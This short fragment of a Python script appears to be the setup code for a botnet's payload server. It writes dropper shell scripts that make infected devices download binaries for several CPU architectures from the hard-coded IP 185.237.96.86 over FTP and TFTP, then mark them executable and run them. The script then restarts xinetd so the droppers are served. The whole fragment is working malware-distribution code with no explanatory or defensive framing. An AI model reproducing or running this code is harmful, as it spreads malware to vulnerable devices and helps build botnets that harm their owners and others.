...
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.237.96.86 '+bin_prefix+i+' '+bin_prefix+i+';chmod +x *;./'+bin_prefix+i+'" >> /var/ftp/sensi1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 185.237.96.86 -c get '+bin_prefix+i+';chmod +x *;./'+bin_prefix+i+'" >> /var/lib/tftpboot/sensi.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g 185.237.96.86;chmod +x *;./'+bin_prefix+i+'" >> /var/lib/tftpboot/sensi2.sh')    
run("service xinetd restart &> /dev/null")
